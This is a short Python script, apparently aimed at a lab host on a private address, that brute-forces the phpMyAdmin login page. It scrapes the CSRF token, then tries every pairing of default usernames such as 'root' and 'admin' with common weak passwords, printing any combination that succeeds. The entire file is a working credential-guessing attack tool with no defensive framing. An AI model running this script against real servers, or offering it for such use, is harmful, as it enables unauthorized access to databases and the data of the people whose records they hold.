import requests

phpmyadmin_url = "http://192.168.180.132/phpmyadmin/index.php"

r = requests.get(phpmyadmin_url);
token = r.text.split('name="token" value="')[1].split('"')[0]

usernames = ["mysql", "root", "admin", "user"]
passwords = ["mysql", "root", "admin", "password", "123456", "12345678", "qwerty", "abc123","password","password123"]


for username in usernames:
    for password in passwords:
        post_data = {
            "pma_username": username,
            "pma_password": password,
            "server": 1,
            "target": "index.php",
            "token": token
        }

        post_request = requests.post(phpmyadmin_url, data=post_data);
        if "Access denied" in post_request.text:
            print("Login failed for username: {} and password: {}".format(username, password))
        else:
            print(f"Login successful! Username: {username}, Password: {password}")